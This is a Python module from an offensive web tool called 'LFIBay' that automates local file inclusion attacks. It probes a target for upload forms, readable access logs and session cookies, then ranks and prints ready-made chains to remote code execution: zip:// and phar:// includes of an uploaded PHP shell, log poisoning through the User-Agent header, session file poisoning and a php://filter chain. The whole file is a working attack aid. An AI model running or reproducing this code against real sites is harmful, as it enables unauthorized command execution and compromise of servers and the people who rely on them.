"""
LFIBay - Attack Chain Detection Module
Automatic detection and suggestion of attack chain opportunities
"""

import requests
from bs4 import BeautifulSoup
import re


def detect_upload_functionality(url, cookies=None):
    """
    Find file upload forms on the target
    Args:
        url: Target URL
        cookies: Session cookies
    Returns: Dictionary with upload detection results
    """
    try:
        response = requests.get(url, cookies=cookies, timeout=10)
        soup = BeautifulSoup(response.content, 'html.parser')
        
        upload_forms = []
        
        # Find all forms
        forms = soup.find_all('form')
        
        for form in forms:
            # Check for file input fields
            file_inputs = form.find_all('input', {'type': 'file'})
            
            if file_inputs:
                form_action = form.get('action', '')
                form_method = form.get('method', 'get').upper()
                
                upload_forms.append({
                    'action': form_action,
                    'method': form_method,
                    'file_fields': [inp.get('name') for inp in file_inputs],
                    'enctype': form.get('enctype', 'application/x-www-form-urlencoded')
                })
        
        return {
            'detected': len(upload_forms) > 0,
            'count': len(upload_forms),
            'forms': upload_forms,
            'attack_potential': 'high' if upload_forms else 'none'
        }
        
    except Exception as e:
        return {
            'detected': False,
            'error': str(e),
            'attack_potential': 'unknown'
        }


def detect_log_access(url, lfi_param='file', cookies=None):
    """
    Check if log files are readable via LFI
    Args:
        url: URL with LFI parameter
        lfi_param: Name of LFI parameter
        cookies: Session cookies
    Returns: Dictionary with accessible log files
    """
    common_logs = [
        '/var/log/apache/access.log',
        '/var/log/apache2/access.log',
        '/var/log/nginx/access.log',
        '/var/log/httpd/access_log',
    ]
    
    accessible_logs = []
    
    for log_path in common_logs:
        try:
            test_url = f"{url}?{lfi_param}={log_path}"
            response = requests.get(test_url, cookies=cookies, timeout=5)
            
            # Check for log file indicators
            content = response.text.lower()
            log_indicators = ['mozilla/', 'get ', 'http/1.', '200 ', '404 ']
            
            if any(indicator in content for indicator in log_indicators):
                accessible_logs.append(log_path)
                
        except:
            continue
    
    return {
        'detected': len(accessible_logs) > 0,
        'accessible_logs': accessible_logs,
        'count': len(accessible_logs),
        'attack_potential': 'high' if accessible_logs else 'low'
    }


def detect_session_control(cookies, url, test_params=None):
    """
    Check if session data can be controlled
    Args:
        cookies: Session cookies dictionary
        url: Target URL
        test_params: List of parameters to test
    Returns: Dictionary with session control detection
    """
    if test_params is None:
        test_params = ['data', 'value', 'user', 'name']
    
    # Check if we have a session cookie
    session_cookie = None
    session_keys = ['PHPSESSID', 'phpsessid', 'session', 'sess_id']
    
    for key in session_keys:
        if key in cookies:
            session_cookie = key
            break
    
    if not session_cookie:
        return {
            'detected': False,
            'reason': 'No session cookie found',
            'attack_potential': 'none'
        }
    
    controllable_params = []
    
    for param in test_params:
        try:
            # Send test value
            test_value = f'test_{param}_12345'
            response = requests.get(
                url,
                params={param: test_value},
                cookies=cookies,
                timeout=5
            )
            
            # If parameter is processed without error, it might be controllable
            if response.status_code == 200:
                controllable_params.append(param)
                
        except:
            continue
    
    return {
        'detected': True,
        'session_cookie': session_cookie,
        'session_id': cookies.get(session_cookie),
        'controllable_params': controllable_params,
        'attack_potential': 'medium' if controllable_params else 'low'
    }


def suggest_attack_chain(findings):
    """
    Recommend optimal exploit path based on findings
    Args:
        findings: Dictionary with detection findings
    Returns: Dictionary with suggested attack chains
    """
    chains = []
    
    # Chain 1: LFI + Upload → zip:// or phar:// wrapper exploitation
    if findings.get('upload', {}).get('detected'):
        chains.append({
            'name': 'File Upload Wrapper Exploitation',
            'difficulty': 'medium',
            'success_probability': 0.7,
            'steps': [
                '1. Upload a ZIP file containing PHP shell (rename to .jpg if needed)',
                '2. Use LFI with zip:// wrapper: zip://uploads/file.jpg#shell.php',
                '3. Execute commands via included PHP shell'
            ],
            'payloads': [
                'zip://uploads/shell.zip%23cmd.php',
                'zip://./uploads/avatar.jpg%23shell.php',
                'phar://uploads/file.phar/cmd.php'
            ],
            'prerequisites': [
                'File upload functionality',
                'LFI vulnerability',
                'Upload directory path known'
            ]
        })
    
    # Chain 2: LFI + Log Access → Log Poisoning
    if findings.get('log_access', {}).get('detected'):
        chains.append({
            'name': 'Log Poisoning Attack',
            'difficulty': 'easy',
            'success_probability': 0.85,
            'steps': [
                '1. Inject PHP code via User-Agent header',
                '2. Use LFI to include poisoned log file',
                '3. Execute injected PHP code'
            ],
            'payloads': findings.get('log_access', {}).get('accessible_logs', []),
            'prerequisites': [
                'LFI vulnerability',
                'Readable log files',
                'Ability to trigger log writes'
            ]
        })
    
    # Chain 3: LFI + Session Control → Session Poisoning
    if findings.get('session_control', {}).get('detected'):
        session_id = findings.get('session_control', {}).get('session_id')
        chains.append({
            'name': 'Session Poisoning Attack',
            'difficulty': 'medium',
            'success_probability': 0.6,
            'steps': [
                '1. Inject PHP code into session via controllable parameter',
                f'2. Use LFI to include session file: /var/lib/php/sessions/sess_{session_id}',
                '3. Execute injected session data as PHP'
            ],
            'payloads': [
                f'/var/lib/php/sessions/sess_{session_id}',
                f'/tmp/sess_{session_id}'
            ],
            'prerequisites': [
                'LFI vulnerability',
                'Session data is controllable',
                'Session files are readable'
            ]
        })
    
    # Chain 4: LFI + Full Control → PHP Filter Chain RCE
    # This is always available if LFI exists
    chains.append({
        'name': 'PHP Filter Chain RCE',
        'difficulty': 'hard',
        'success_probability': 0.5,
        'steps': [
            '1. Generate PHP filter chain for desired command',
            '2. Use LFI with filter chain payload',
            '3. Execute arbitrary PHP code without file upload'
        ],
        'payloads': [
            'php://filter/convert.iconv.UTF8.CSISO2022KR|...|resource=index.php'
        ],
        'prerequisites': [
            'LFI vulnerability',
            'PHP filter wrappers enabled',
            'allow_url_include not required'
        ]
    })
    
    # Sort by success probability (highest first)
    chains.sort(key=lambda x: x['success_probability'], reverse=True)
    
    return {
        'total_chains': len(chains),
        'recommended_order': chains,
        'best_chain': chains[0] if chains else None
    }


def calculate_success_probability(chain_type, findings):
    """
    Estimate success rate for an attack chain
    Args:
        chain_type: Type of attack chain
        findings: Detection findings
    Returns: Float between 0.0 and 1.0
    """
    probabilities = {
        'upload_wrapper': 0.7,
        'log_poisoning': 0.85,
        'session_poisoning': 0.6,
        'filter_chain': 0.5,
        '/proc_exploitation': 0.4,
    }
    
    base_prob = probabilities.get(chain_type, 0.5)
    
    # Adjust based on findings
    if chain_type == 'log_poisoning':
        if findings.get('log_access', {}).get('count', 0) > 2:
            base_prob += 0.1  # Multiple accessible logs increases success
    
    if chain_type == 'upload_wrapper':
        if findings.get('upload', {}).get('count', 0) > 1:
            base_prob += 0.15  # Multiple upload points
    
    return min(base_prob, 1.0)  # Cap at 1.0


def perform_full_reconnaissance(url, lfi_param='file', cookies=None):
    """
    Perform complete reconnaissance for attack chain detection
    Args:
        url: Target URL
        lfi_param: LFI parameter name
        cookies: Session cookies
    Returns: Complete findings dictionary
    """
    print("[*] Starting reconnaissance...")
    
    findings = {}
    
    # Detect upload functionality
    print("[*] Checking for file upload...")
    findings['upload'] = detect_upload_functionality(url, cookies)
    
    # Detect log access
    print("[*] Testing log file access...")
    findings['log_access'] = detect_log_access(url, lfi_param, cookies)
    
    # Detect session control
    print("[*] Analyzing session control...")
    if cookies:
        findings['session_control'] = detect_session_control(cookies, url)
    else:
        findings['session_control'] = {'detected': False, 'reason': 'No cookies provided'}
    
    # Generate attack suggestions
    print("[*] Generating attack chain suggestions...")
    findings['suggested_chains'] = suggest_attack_chain(findings)
    
    return findings


def create_attack_report(findings):
    """
    Create human-readable attack chain report
    Args:
        findings: Reconnaissance findings
    Returns: String report
    """
    report = []
    report.append("=" * 70)
    report.append("ATTACK CHAIN DETECTION REPORT")
    report.append("=" * 70)
    
    # Upload detection
    upload = findings.get('upload', {})
    report.append(f"\n📤 FILE UPLOAD DETECTION")
    report.append(f"  Status: {'✓ DETECTED' if upload.get('detected') else '✗ NOT FOUND'}")
    if upload.get('forms'):
        report.append(f"  Forms Found: {upload['count']}")
        for i, form in enumerate(upload['forms'], 1):
            report.append(f"    {i}. {form['action']} ({form['method']})")
    
    # Log access
    logs = findings.get('log_access', {})
    report.append(f"\n📝 LOG FILE ACCESS")
    report.append(f"  Status: {'✓ ACCESSIBLE' if logs.get('detected') else '✗ NOT ACCESSIBLE'}")
    if logs.get('accessible_logs'):
        report.append(f"  Accessible Logs:")
        for log in logs['accessible_logs']:
            report.append(f"    - {log}")
    
    # Session control
    session = findings.get('session_control', {})
    report.append(f"\n🔐 SESSION CONTROL")
    report.append(f"  Status: {'✓ ACTIVE SESSION' if session.get('detected') else '✗ NO SESSION'}")
    if session.get('session_id'):
        report.append(f"  Session ID: {session['session_id'][:20]}...")
    if session.get('controllable_params'):
        report.append(f"  Controllable Parameters: {', '.join(session['controllable_params'])}")
    
    # Attack suggestions
    chains = findings.get('suggested_chains', {})
    if chains.get('recommended_order'):
        report.append(f"\n🎯 RECOMMENDED ATTACK CHAINS ({chains['total_chains']} total)")
        report.append("")
        
        for i, chain in enumerate(chains['recommended_order'], 1):
            report.append(f"{i}. {chain['name']}")
            report.append(f"   Difficulty: {chain['difficulty'].upper()}")
            report.append(f"   Success Probability: {chain['success_probability']* 100:.0f}%")
            report.append(f"   Steps:")
            for step in chain['steps']:
                report.append(f"     {step}")
            report.append("")
    
    report.append("=" * 70)
    
    return "\n".join(report)


def get_next_action(findings):
    """
    Get recommended next action based on findings
    Args:
        findings: Reconnaissance findings
    Returns: Dictionary with next action
    """
    chains = findings.get('suggested_chains', {})
    best_chain = chains.get('best_chain')
    
    if not best_chain:
        return {
            'action': 'manual_testing',
            'message': 'No automated chains detected. Proceed with manual testing.'
        }
    
    return {
        'action': best_chain['name'].lower().replace(' ', '_'),
        'chain': best_chain,
        'message': f"Recommended: {best_chain['name']} (Success: {best_chain['success_probability']*100:.0f}%)"
    }
